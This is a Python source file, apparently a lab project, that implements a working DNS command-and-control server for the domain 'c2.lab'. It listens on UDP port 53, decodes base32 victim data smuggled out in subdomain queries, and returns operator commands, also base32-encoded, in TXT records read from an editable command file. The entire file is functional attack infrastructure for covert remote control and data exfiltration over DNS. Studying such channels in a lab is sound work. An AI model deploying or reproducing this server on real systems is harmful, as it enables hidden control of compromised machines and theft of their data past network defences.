#!/usr/bin/env python3
"""
C2 Server — DNS Command and Control
Listens on port 53 as authoritative DNS server for c2.lab
Receives victim data encoded in subdomain queries
Replies with encoded commands in TXT records
 
HOW IT WORKS:
  1. Victim sends: ENCODED_DATA.c2.lab (DNS query)
  2. Server extracts ENCODED_DATA subdomain
  3. Decodes base32 to read victim output
  4. Encodes next command in base32
  5. Replies as DNS TXT record
 
Author: Ketan Vala — DNS Project
"""
import base64
import logging
import os
from dnslib import DNSRecord, RR, QTYPE, TXT
from dnslib.server import DNSServer, BaseResolver
 
C2_DOMAIN    = "c2.lab."
LOG_FILE     = "/home/ketan/c2_server.log"
COMMAND_FILE = "/home/ketan/command.txt"
DEFAULT_CMD  = "hostname"
 
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [SERVER] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
log = logging.getLogger()
 
def get_command():
    """Read current command from file (can change while running)."""
    if os.path.exists(COMMAND_FILE):
        with open(COMMAND_FILE) as f:
            cmd = f.read().strip()
            if cmd:
                return cmd
    return DEFAULT_CMD
 
def decode_subdomain(subdomain):
    """Decode base32 data from DNS subdomain."""
    try:
        padding = (8 - len(subdomain) % 8) % 8
        padded  = subdomain.upper() + "=" * padding
        return base64.b32decode(padded).decode("utf-8", errors="ignore").strip()
    except Exception:
        return ""
 
def encode_command(command):
    """Encode command to base32 for DNS TXT reply."""
    return base64.b32encode(command.encode()).decode().rstrip("=").lower()
 
class C2Resolver(BaseResolver):
    """DNS resolver that acts as C2 server."""
 
    def resolve(self, request, handler):
        reply = request.reply()
        qname = str(request.q.qname)
 
        # Only handle our C2 domain
        if C2_DOMAIN not in qname:
            return reply
 
        # Extract subdomain (encoded victim data)
        subdomain = qname.replace(C2_DOMAIN, "").strip(".").split(".")[0]
        if not subdomain:
            return reply
 
        # Decode victim data
        data = decode_subdomain(subdomain)
        if data:
            log.info(f"RECEIVED: '{data}'")
            log.info(f"  Raw subdomain: '{subdomain}'")
 
        # Get command to send back
        command     = get_command()
        encoded_cmd = encode_command(command)
 
        # Reply with TXT record containing encoded command
        reply.add_answer(
            RR(qname, QTYPE.TXT, rdata=TXT(encoded_cmd), ttl=1)
        )
        log.info(f"SENT CMD: '{command}'")
        return reply
 
def main():
    # Create command file with default
    with open(COMMAND_FILE, "w") as f:
        f.write(DEFAULT_CMD)
 
    log.info("=" * 50)
    log.info("C2 SERVER STARTING")
    log.info(f"  Domain:  {C2_DOMAIN}")
    log.info(f"  Listen:  0.0.0.0:53 UDP")
    log.info(f"  Command: {DEFAULT_CMD}")
    log.info("=" * 50)
 
    server = DNSServer(
        C2Resolver(), port=53, address="0.0.0.0", tcp=False
    )
 
    try:
        server.start()
    except KeyboardInterrupt:
        log.info("Server stopped by user")
        server.stop()
    except PermissionError:
        log.error("ERROR: Run with sudo (port 53 needs root)")
        log.error("Usage: sudo python3 c2_server.py")
 
if __name__ == "__main__":
    main()
